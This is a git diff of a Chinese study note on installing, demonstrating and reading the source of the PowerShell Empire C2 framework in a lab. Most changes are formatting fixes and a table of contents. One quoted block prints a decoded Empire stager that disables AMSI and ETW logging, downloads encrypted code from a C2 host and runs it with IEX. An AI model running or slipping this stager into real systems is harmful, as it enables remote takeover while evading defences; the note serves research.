@@ -12,6 +12,27 @@
 
 ---
 
+- [Powershell Empire](#powershell-empire)
+  - [安装](#安装)
+    - [Github](#github)
+      - [1.clone 仓库本体及相关依赖仓库](#1clone-仓库本体及相关依赖仓库)
+      - [2. 切到稳定版本并安装](#2-切到稳定版本并安装)
+      - [上线个机子验一下能不能用](#上线个机子验一下能不能用)
+    - [Kali](#kali)
+    - [Demo](#demo)
+      - [拓扑](#拓扑)
+      - [起 server](#起-server)
+      - [起 Client](#起-client)
+      - [新建一个 http listener](#新建一个-http-listener)
+      - [执行命令以上线主机](#执行命令以上线主机)
+  - [Starkiller](#starkiller)
+  - [整体源码概述](#整体源码概述)
+    - [调试](#调试)
+    - [主程序入口](#主程序入口)
+    - [Listener](#listener)
+
+---
+
 ## 安装
 
 ### Github
@@ -34,7 +55,7 @@ git clone --recursive https://github.com/BC-SECURITY/Empire.git
 
 ![image-20230904171831597](http://cdn.ayusummer233.top/DailyNotes/202309041718686.png)
 
-上面的全是首次 clone 失败的 reference repo, 失败后会加入计划任务, 全 clone 一遍后会重新 clone  失败的仓库
+上面的全是首次 clone 失败的 reference repo, 失败后会加入计划任务, 全 clone 一遍后会重新 clone 失败的仓库
 
 如下即为重新 clone 成功了:
 
@@ -85,7 +106,7 @@ sudo ./setup/install.sh
 
 ![image-20230904175450645](http://cdn.ayusummer233.top/DailyNotes/202309041754737.png)
 
-> 这里由于网络原因超时了↑, 然后后面恢复了:
+> 这里由于网络原因超时了 ↑, 然后后面恢复了:
 
 然后应该是吧 xar 的目录列出来了:
 
@@ -105,7 +126,7 @@ sudo ./setup/install.sh
 
 ![image-20230904175952167](http://cdn.ayusummer233.top/DailyNotes/202309041759237.png)
 
-----
+---
 
 然后似乎是在拿 gcc 编译 libxml, 报了一堆 warning, 应该不用管
 
@@ -117,7 +138,7 @@ sudo ./setup/install.sh
 
 ![image-20230904180306732](http://cdn.ayusummer233.top/DailyNotes/202309041803795.png)
 
-----
+---
 
 编译 `xar`:
 
@@ -237,7 +258,7 @@ pip install pycparser
 
 > [[已解决\] poetry install 命令安装依赖报错，无法安装部分依赖 · Issue #1217 · HibiKier/zhenxun_bot (github.com)](https://github.com/HibiKier/zhenxun_bot/issues/1217)
 >
-> [python - DBusErrorResponse while running poetry install - Stack Overflow --- python - 运行诗歌安装时的DBusErrorResponse - VoidCC](https://stackoverflow.com/questions/75080993/dbuserrorresponse-while-running-poetry-install)
+> [python - DBusErrorResponse while running poetry install - Stack Overflow --- python - 运行诗歌安装时的 DBusErrorResponse - VoidCC](https://stackoverflow.com/questions/75080993/dbuserrorresponse-while-running-poetry-install)
 
 尝试直接 poetry add 看看:
 
@@ -249,7 +270,7 @@ pip install pycparser
 >
 > [Error: Unable to store the password for poetry-repository-pypi in the key ring: Failed to unlock the collection! · Issue #2692 · python-poetry/poetry --- 错误：无法在钥匙圈中存储诗歌存储库-pypi 的密码：无法解锁集合！ · 问题 #2692 · python-poetry/poetry (github.com)](https://github.com/python-poetry/poetry/issues/2692)
 >
-> [python poetry 1.0.0 private repo issue fix – Frank-Mich's Blog --- python诗1.0.0私人回购问题修复 – Frank-Mich的博客](https://blog.frank-mich.com/python-poetry-1-0-0-private-repo-issue-fix/)
+> [python poetry 1.0.0 private repo issue fix – Frank-Mich's Blog --- python 诗 1.0.0 私人回购问题修复 – Frank-Mich 的博客](https://blog.frank-mich.com/python-poetry-1-0-0-private-repo-issue-fix/)
 
 两个报错最终都指向了 kering, 且都提到了同一种解决方案:
 
@@ -287,7 +308,7 @@ source ~/.bashrc
 >
 > **Nim**是一个[指令式](https://zh.wikipedia.org/wiki/指令式編程)、[通用](https://zh.wikipedia.org/wiki/通用编程语言)、[多范式](https://zh.wikipedia.org/wiki/多重编程范式)、[静态类型](https://zh.wikipedia.org/wiki/静态类型)、[编译型](https://zh.wikipedia.org/wiki/編譯語言)的[编程语言](https://zh.wikipedia.org/wiki/编程语言), 设计目标是像[C](https://zh.wikipedia.org/wiki/C语言)一样快速，像[Python](https://zh.wikipedia.org/wiki/Python)一样有表达力，并像[Lisp](https://zh.wikipedia.org/wiki/Lisp)一样有扩展性。
 
-----
+---
 
 接下来起一下 server client 试试
 
@@ -323,7 +344,7 @@ source ~/.bashrc
 
 ![image-20230905143159838](http://cdn.ayusummer233.top/DailyNotes/202309051431951.png)
 
-----
+---
 
 总算是成功通过源码装好了, 嫌费劲的话还是直接 apt 装就行了:
 
@@ -331,11 +352,11 @@ source ~/.bashrc
 sudo apt install powershell-empire
 ```
 
-----
+---
 
 #### 上线个机子验一下能不能用
 
-具体步骤可以参阅下面的 [Demo章节](#Demo)
+具体步骤可以参阅下面的 [Demo 章节](#Demo)
 
 在生成上线命令时报错了:
 
@@ -506,7 +527,7 @@ def run(args):
 
 这样就不用更新了, 不过直接改默认配置更方便, 之后需要更新的时候可以再改回来
 
-----
+---
 
 然后在 client 端成功生成了上线命令:
 
@@ -516,7 +537,7 @@ def run(args):
 
 > 不过后续使用的时候发现有时又不能复制了, 又是一样的报错, 感觉有可能是因为我 ssh 连上去之后拷贝要跨机子所以报错了? 不过反正也不影响, 直接手动拷贝也可以
 
-----
+---
 
 上线个机子试试:
 
@@ -654,30 +675,30 @@ powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUA
 > 里面的 `\u0000` 无用, 去除 `\u0000` 并规范化后得到:
 >
 > ```powershell
-> If ($PSVersionTable.PSVersion.Major -ge 3) { 
->     $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); 
->     $Ref.GetField('amsiInitFailed', 'NonPublic,Static').Setvalue($Null, $true); 
->     [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider', 'NonPublic,Static').GetValue($null), 0); 
-> }; 
-> [System.Net.ServicePointManager]::Expect100Continue = 0; 
-> $wc = New-Object System.Net.WebClient; 
-> $u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; 
-> $ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADAAMAAuADEALgAxAC4AMQAzADYAOgA5ADAAOQAwAA=='))); 
-> $t = '/login/process.php'; $wc.Headers.Add('User-Agent', $u); 
-> $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy; 
-> $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; 
-> $Script:Proxy = $wc.Proxy; 
-> $K = [System.Text.Encoding]::ASCII.GetBytes('Huv,3gtsc}#_E:fFXwn2bUPV|iMe0+5R'); 
-> $R = { 
+> If ($PSVersionTable.PSVersion.Major -ge 3) {
+>     $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
+>     $Ref.GetField('amsiInitFailed', 'NonPublic,Static').Setvalue($Null, $true);
+>     [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled', 'NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider', 'NonPublic,Static').GetValue($null), 0);
+> };
+> [System.Net.ServicePointManager]::Expect100Continue = 0;
+> $wc = New-Object System.Net.WebClient;
+> $u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
+> $ser = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADAAMAAuADEALgAxAC4AMQAzADYAOgA5ADAAOQAwAA==')));
+> $t = '/login/process.php'; $wc.Headers.Add('User-Agent', $u);
+> $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
+> $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+> $Script:Proxy = $wc.Proxy;
+> $K = [System.Text.Encoding]::ASCII.GetBytes('Huv,3gtsc}#_E:fFXwn2bUPV|iMe0+5R');
+> $R = {
 >     $D, $K = $Args; $S = 0..255; 0..255 | % {
->         $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256; $S[$_], $S[$J] = $S[$J], $S[$_] 
->     }; 
->     $D | % { $I = ($I + 1) % 256; $H = ($H + $S[$I]) % 256; $S[$I], $S[$H] = $S[$H], $S[$I]; $_-bxor$S[($S[$I] + $S[$H]) % 256] } 
-> }; 
-> $wc.Headers.Add("Cookie", "cHGAfdLZDCEtLMK=lLq8UwiEuzvIQD4j7p6IJshii1E="); 
-> $data = $wc.DownloadData($ser + $t); 
-> $iv = $data[0..3]; 
-> $data = $data[4..$data.length]; 
+>         $J = ($J + $S[$_] + $K[$_ % $K.Count]) % 256; $S[$_], $S[$J] = $S[$J], $S[$_]
+>     };
+>     $D | % { $I = ($I + 1) % 256; $H = ($H + $S[$I]) % 256; $S[$I], $S[$H] = $S[$H], $S[$I]; $_-bxor$S[($S[$I] + $S[$H]) % 256] }
+> };
+> $wc.Headers.Add("Cookie", "cHGAfdLZDCEtLMK=lLq8UwiEuzvIQD4j7p6IJshii1E=");
+> $data = $wc.DownloadData($ser + $t);
+> $iv = $data[0..3];
+> $data = $data[4..$data.length];
 > -join [Char[]](& $R $data ($IV + $K)) | IEX
 > ```
 
@@ -742,7 +763,7 @@ agents
 
 > ![image-20230528231930403](http://cdn.ayusummer233.top/DailyNotes/202305282319434.png)
 
-----
+---
 
 ## Starkiller
 
@@ -772,7 +793,7 @@ agents
 
 ![image-20230906161855631](http://cdn.ayusummer233.top/DailyNotes/202309061618685.png)
 
-不在 empire 本机打开网页的话需要把 URL 中的 localhost 改成 empire 机子的ip
+不在 empire 本机打开网页的话需要把 URL 中的 localhost 改成 empire 机子的 ip
 
 ![image-20230906162822599](http://cdn.ayusummer233.top/DailyNotes/202309061628667.png)
 
@@ -790,7 +811,7 @@ agents
 
 ![image-20230908170913223](http://cdn.ayusummer233.top/DailyNotes/202309081709825.png)
 
-----
+---
 
 在 `Settings` 页面可以修改当前用户的密码, 以及`登出` :
 
@@ -802,11 +823,11 @@ agents
 
 ![image-20230908171539888](http://cdn.ayusummer233.top/DailyNotes/202309081715037.png)
 
-----
+---
 
 ## 整体源码概述
 
-> [Empire源码分析（一） - 跳跳糖 (tttang.com)](https://tttang.com/archive/1281/)  -- 19年的博客, 应该是旧版的源码目录分析, 这里作为参考, 可能是检索方法的原因, 也可能是真没有相关资源, 总之并没有检索出什么 Powershell Empire 源码分析的文章
+> [Empire 源码分析（一） - 跳跳糖 (tttang.com)](https://tttang.com/archive/1281/) -- 19 年的博客, 应该是旧版的源码目录分析, 这里作为参考, 可能是检索方法的原因, 也可能是真没有相关资源, 总之并没有检索出什么 Powershell Empire 源码分析的文章
 
 ```bash
 # 可以在项目根目录下使用 tree 命令以及 -L 参数来指定层级生成项目结构树
@@ -887,30 +908,27 @@ tree -L 3 > tree.md
 
 ```json
 {
-    "version": "0.2.0",
-    "configurations": [
-        {
-            "name": "Powershell Empire Server",
-            "type": "python",
-            "request": "launch",
-            "program": "${workspaceFolder}/empire.py", // Empire 入口程序
-            "python": "${workspaceFolder}/.venv/bin/python",  // Poetry 虚拟环境中的 Python 解释器路径
-            "args": [
-                "server"
-            ],
-            "cwd": "${workspaceFolder}",
-            "console": "integratedTerminal"
-        }
-    ]
+  "version": "0.2.0",
+  "configurations": [
+    {
+      "name": "Powershell Empire Server",
+      "type": "python",
+      "request": "launch",
+      "program": "${workspaceFolder}/empire.py", // Empire 入口程序
+      "python": "${workspaceFolder}/.venv/bin/python", // Poetry 虚拟环境中的 Python 解释器路径
+      "args": ["server"],
+      "cwd": "${workspaceFolder}",
+      "console": "integratedTerminal"
+    }
+  ]
 }
-
 ```
 
 然后可以在主程序上打断点来做调试
 
 ![image-20230911110231233](http://cdn.ayusummer233.top/DailyNotes/202309111102431.png)
 
-----
+---
 
 ### 主程序入口
 
@@ -1017,13 +1035,13 @@ def run(args):
 
 此函数主要用于检查数据库的初始状态是否正确, 不正确则输出报错提示(一般会在大版本更新的时候出现这种情况)
 
-- 创建了一个数据库会话 Session 用于与数据库交互;  
+- 创建了一个数据库会话 Session 用于与数据库交互;
 - 如果当前用了 mysql 的话则检查 `unique_check` 列, 不存在则创建, 用来作为键值
 - 创建索引 `agent_checkin_idx` 来加速对 `AgentCheckIn` 表的 `agent_id` 以及 `checkin_time` 列的查询
 - 检查并生成用户记录、数据库配置记录、关键词模糊记录以及混淆配置记录的默认配置
 - 检查数据库表结构与 model 是否一致, 有问题则输出报错并退出程序
 
-----
+---
 
 接着就是初始化 main menu, 加载插件与配置:
 
@@ -1041,13 +1059,13 @@ def run(args):
 
 ![image-20230907154705101](http://cdn.ayusummer233.top/DailyNotes/202309071547200.png)
 
-----
+---
 
 配置 CORS, 创建一个支持异步的 WebSocket 服务器
 
 ![image-20230907155022075](http://cdn.ayusummer233.top/DailyNotes/202309071550193.png)
 
-----
+---
 
 加载 Starkiller, 证书并启动服务
 
@@ -1059,11 +1077,11 @@ def run(args):
 
 ### Listener
 
-> [Empire源码分析（一） - 跳跳糖 (tttang.com)](https://tttang.com/archive/1281/)
+> [Empire 源码分析（一） - 跳跳糖 (tttang.com)](https://tttang.com/archive/1281/)
 
 下面开始研究 Empire 中的 `listener`, `stager` 与 `agent`
 
-- `listener`: 监听器, C2服务器需要与被控端连接以向其发布命令, 这就需要开放一个端口来与被控端连接; Empire 中的 http listener 就是起了一个 flask web application, 利用 flask 内置的 WSGI 来作为 server
+- `listener`: 监听器, C2 服务器需要与被控端连接以向其发布命令, 这就需要开放一个端口来与被控端连接; Empire 中的 http listener 就是起了一个 flask web application, 利用 flask 内置的 WSGI 来作为 server
 - `stager` 是一个小心地木马程序 用于在目标机器上执行并与 listener 建立连接; Empire 支持通过 `usestager` 命令生成不同文件格式的 stager 以适应不同目标系统和执行方式
 - `agent` 则是指代被控端
 
@@ -1113,7 +1131,23 @@ uselistener http
 
 ![image-20230911143308960](http://cdn.ayusummer233.top/DailyNotes/202309111433067.png)
 
-一千多行的 listener 实现
+一千多行的 listener 实现, 其中主要的函数有:
+
+![image-20230912002615647](http://cdn.ayusummer233.top/DailyNotes/202309120026688.png)
+
+- `default_response`: IIS 7.5 404 not found page
+- `validate_options`: 检查 listener 中必要的 options 是否都设置好了
+- `generate_launcher`: 为指定 listener 生成基础的启动器
+- `generate_stager`: 生成与该 listener 通信所需的 stager 代码
+- `generate_agent`: 生成与该 listener 通信所需的完整的 agent 代码
+- `generate_comms`: 仅生成与该 listener 通信所需的 agent 代码块, 从而可以为新的 listener 动态更新 agent
+- `start_server`: 根据配置生成与启动相应 Flask APP 线程
+- `start`: Listener Start, 启动 `start_server()` 的线程实例并将其存储在 `self.threads` 字典中
+- `shutdown`: Listener Stop, 中断存储在 `self.threads` 字典中的 server 线程
+
+具体函数实现在后面用到时再进行分析
+
+---
 
 其结构与 client 端看到的回显一致:
 
@@ -1165,11 +1199,17 @@ tcpdump -nn -vv -i lo -w 202309111557_测一下httpListenerExecute命令做了�
 
 ![image-20230911164619885](http://cdn.ayusummer233.top/DailyNotes/202309111646015.png)
 
+---
+
 后续交互就可以看下具体的路由了, 这里先简单捋一下
 
-- 
+![image-20230912000225909](http://cdn.ayusummer233.top/DailyNotes/202309120002970.png)
 
-----
+- `/download/<stager>/`: 下载 `stager`
+- `/`, `/iisstart.htm`: 展示首页
+- ==GET, POST== `/<path:request_uri>`: 用于真正进行 C2 与 agent 之间的通信
+
+---
 
 之于前面的外层的 Thread 函数则是为 Listener 的 Flask app 另外起个线程跑:
 
@@ -1179,7 +1219,4 @@ tcpdump -nn -vv -i lo -w 202309111557_测一下httpListenerExecute命令做了�
 
 ![image-20230911165028907](http://cdn.ayusummer233.top/DailyNotes/202309111650016.png)
 
-----
-
-如此依赖
-
+---
